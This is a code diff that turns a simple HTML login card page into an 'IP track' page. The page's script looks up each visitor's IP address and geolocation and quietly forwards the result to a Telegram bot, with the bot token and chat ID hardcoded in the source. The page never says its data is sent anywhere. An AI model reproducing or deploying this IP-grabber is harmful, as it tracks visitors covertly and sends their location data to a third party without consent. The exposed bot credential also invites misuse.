@@ -1,40 +1,53 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="login.css">
-  <title>Login Card</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP track</title>
+    <style>
+        body{
+            background-color: black;
+        }
+        h1, pre{
+            color: green;
+        }
+    </style>
 </head>
 <body>
-  <div class="content">
-      
-      <div class="login-card">
-          <h2>Login</h2>
-          <form class="login-form">
-              <div class="form-group">
-                  <label for="username">Username:</label>
-                  <input type="text" id="username" name="username" required>
-                </div>
-                <div class="form-group">
-                    <label for="password">Password:</label>
-                    <input type="password" id="password" name="password" required>
-                </div>
-                <a href="#">
-                    <legend id="forgot-pass">
-                        Forgot Password?
-                    </legend>
-                </a>
-                <div class="form-group">
-                    <button type="submit">Login</button>
-                </div>
-                <a href="#">
-                    <legend id="signup">
-                        Not a member?
-                    </legend>
-                </a>
-            </form>
-        </div>
+    <div>
+        <h1 id="ip-display">Your IP address is </h1>
+        <pre id="response"></pre>
     </div>
-    </body>
+
+    <script>
+        var userIP; var DataIP;
+        fetch("https://api.ipify.org?format=json").then(response => response.json()).then(data => {
+            userIP = data.ip;
+            document.getElementById("ip-display").textContent += userIP;
+
+            return fetch(`http://ip-api.com/json/${userIP}`);
+        })
+        .then(response => response.json()).then(data => {
+
+            DataIP = JSON.stringify(data, null, 4);
+            document.getElementById("response").textContent = DataIP;
+
+            sendToBot(DataIP);
+        }).catch(error => console.error("Error", error));
+
+        function sendToBot(message){
+            const botToken = `7783111392:AAHz2UAey5K5GRZRzAAMdrriZJUWQTF1ztU`;
+            const chatId = `5489663143`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: DataIP
+                })
+            });
+        }
+        
+    </script>
+</body>
 </html>
